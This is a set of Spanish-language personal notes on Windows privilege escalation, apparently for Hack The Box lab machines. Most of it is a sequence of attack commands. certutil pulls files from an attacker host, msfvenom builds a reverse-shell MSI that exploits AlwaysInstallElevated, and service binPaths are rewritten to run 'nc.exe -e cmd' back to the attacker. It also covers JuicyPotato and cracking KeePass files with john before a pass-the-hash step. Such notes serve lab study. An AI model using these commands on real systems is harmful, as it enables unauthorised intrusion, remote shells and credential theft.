# Escalacion de privilegios Windows

Usar **WinPEAS** ya que te escanea y te muestra las vulnerabilidades 
Debemos de descargar el archivo **winPeasx64.exe**
Usamos este comando en la maquina victima Windows para cargar un archivo de la maquina de atacante
❯ **certutil.exe -f -urlcache -split http://10.10.14.2/winPeas.exe winPeas.exe**
Podemos observar que de toda la informacion nos despliega el ‘**Checking AlwaysInstallElevated**’ y tiene:
	* **set 1 in HKLM** 
	* **set 1 in HKCU** lo cual es malo para esa maquina Windows.
Podemos usar el siguiente comando para crear un archivo malicioso y asi explotar la vulnerabilidad anterior
❯ **msfvenon -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 --plataform windows -a 64 -f msi -o reverse.msi** 
	* LHOST ->  IP de atacante
	* LPORT -> puerto Netcat 443
	* p -> payload 
	* a -> arquitectura x64
	* f -> formato
	* nombre del archivo -> reverse.msi
Usamos este comando en la maquina victima Windows para cargar un archivo de la maquina de atacante 
❯ **certutil.exe -f -urlcache -split http://10.10.14.2/reverse.msi reverse.msi**
Para instalar el archivo .msi en una maquina Windows debemos de colocar el siguiente comando:
❯ **msiexec /quiet /qn /i reverse.msi**

****
❯  **whoami /priv** Miramos los privilegios que tenemos  
	**SeInpersonatePrivilege** En el cual podriamos usar RottenPotato o  JuicyPotato 

❯ **Systeminfo** 
	Nos copiamos todo lo que nos salga con ese comando y usaremos un programa llamado '' para deterctar vulnerabilidades en un equipo Windows, todo desde nuestra maquina Linux con el archivo que hemos creado con ese informacion obtenida.

****
❯ **net user < USER>** Nos da detalles de nuestro usuario y vemos a que grupos pertenecemos. El grupo que nos interesa en este caso es **Server Operators** ya que en el podemos administrar controladores de dominio, loggearse a un servicio interactivo, asi como crear, borrar recursos compartidos en la red, iniciar, parar servicios, back up, restaurar archivos, formatear el disco duro de la computadora y apagarla. Por lo que debemos verificar sipertenecemos a este grupo.
Por lo que cargaremos a la maquina Victima Netcat.exe que se encuentra en la maquina Atacante y lo subimos con:
	❯ **upload /home/omar/Docume/HTB/nc.exe** Subimos el archivo del Netcat a la maquina victima 
	
❯ **sc.exe create** **reverse** **binPath=”C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd 10.10.14.10 443”** Le decimos al equipo victima que cuando arranque el servicio queremos que ejecute el netcat y nos ejecute una revershell contra el nuestro equipo por el puerto 443. (create=creamos el servicio, reverse=nombre del servicio) 
Si no nos deja, hacemos lo siguiente:
❯ **Services** Para ver los servicios que estan corriendo en Windows y asi ver si podemos cambiarle el binPath a uno, esto dependiendo si nos encontramos en el grupo de **Server Operators** y asi podernos montar una revershell con algun servicio con sc.exe
	❯ **sc.exe config VMTools binPath=”C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd 10.10.14.10 443”** Colocaremos un servicio que nos deje cambiar su binPath, el servicio va despues de config. (Nos saldra success)
	Despues paramos el servicio que hemos reconfigurado y lo volvemos a iniciar para que se ejecute el netcat.
	❯ **sc.exe stop VMTools** Paramos el servicio
	❯ **sc.exe start VMTools** Iniciamos el servicio
****














- Encontrar un archivo con extencion **.kdbx** 
	Son archivos de datos creados por KeePass 'Password Safe', se refieren a la passwd de base de datos KeePass
	❯ **keepassxc FILE.kdbx** Nos permite abrir un archivo keepass con passwd, de lo contrario hacemos lo siguiente 
	❯ **keepass2john FILE.kdbx > hash** Si no sabemos la passwd, esto no sayuda a extraer un hash para poder hacer fuerza bruta, guardandolo en un archivo llamado hash
	❯ **john --wordlist=/usr/share/wordlists/rockyou.txt hash** Aplicamos un ataque de fuerza bruta a un archivo hash y obtener la passwd que colocaremos en el keepass y nos devolvera otro hash el cual...
	Y todo para poder hacer un 'pass the hash', verificando con crackmapexec y entrando con psexec 
  - 